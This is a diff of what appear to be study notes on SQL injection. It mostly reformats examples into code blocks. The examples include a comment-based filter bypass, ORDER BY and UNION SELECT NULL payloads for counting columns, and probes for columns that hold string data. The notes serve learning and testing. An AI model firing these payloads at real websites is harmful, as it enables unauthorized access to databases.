@@ -31,7 +31,8 @@ is :
 For an insecure website, an attacker can construct an attack to include inreleased products :
 
 https//website.com:products?category=Gifts`'--`
-`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`
+
+The following SQL query is : `SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`
 
 The double dash sequence is a commment indicator that mean the rest of the query is interpreted as a comment.
 
@@ -66,21 +67,20 @@ so we need to find how many columns are being returned from the original query +
 
 **1 :** injecting a serie of ORDER BY clauses and incrementing the specified column index :
 
-`' ORDER BY 1--`
-
-`' ORDER BY 2--`
-
-`' ORDER BY 3--`
-
-`etc...`
+```
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+etc...
+```
 
 **2 :** submitting a series of UNION SELECT payloads :
 
-`' UNION SELECT NULL--`
-
-`' UNION SELECT NULL,NULL--`
-
-`etc...`
+```
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+etc...
+```
 
 if the number of nulls does not match the number of columns, the database can return an error.
 **Why using NULL ?** NULL is convertible to every commonly used data type, so using NULL maximizes the canche that the payload succeed when the column count is correct.
@@ -96,11 +96,11 @@ On MySQL, the `--` sequence must be followed by a space. Alternatively, a `#` ca
 Generally, the interesting data will be in string form.
 Having already determined the number of columns, you can test each column by placing a string value, for example if the query return 3 columns :
 
-`' UNION SELECT 'a',NULL,NULL--`
-
-`' UNION SELECT NULL,'a',NULL--`
-
-`' UNION SELECT NULL,NULL,'a'--`
+```
+' UNION SELECT 'a',NULL,NULL--
+' UNION SELECT NULL,'a',NULL--
+' UNION SELECT NULL,NULL,'a'--
+```
 
 If an error does not occur, then the column is suitable for retrieving string data.
 
